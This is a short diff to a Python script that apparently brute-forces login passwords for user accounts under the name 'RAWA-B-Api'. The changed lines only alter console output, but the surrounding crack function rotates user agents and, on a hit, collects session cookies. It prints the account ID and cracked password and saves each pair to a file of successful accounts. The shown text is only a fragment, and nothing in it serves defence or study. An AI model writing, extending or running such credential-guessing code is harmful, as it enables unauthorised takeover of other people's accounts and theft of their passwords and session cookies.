@@ -643,8 +643,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r \033[1;31m[RAWA-B-Api][\033[2;32m{loop}\033[1;31m{P}/{h}{len(id)}{P}]\033[2;32m [{ok}]\x1b[38;5;208m{P} \033[1;34m "),
-    sys.stdout.flush()
+    sys.stdout.write('\x1b[1;92m [ RAWA-B-Api ]  %s  ~ \033[1;32m  > OK  %s\033[1;37m \x1b[1;91m    %s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
     ses = requests.Session()
@@ -697,7 +696,7 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               #  print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
-                print(f'\r\x1b[32[RAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
+                print(f'\r{x}{B}ID    :  {H}{idf} \n{B}PASSWORD : {H} {pw}\n{B}UGENT    :  {H}{ua}{N}')
                # print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
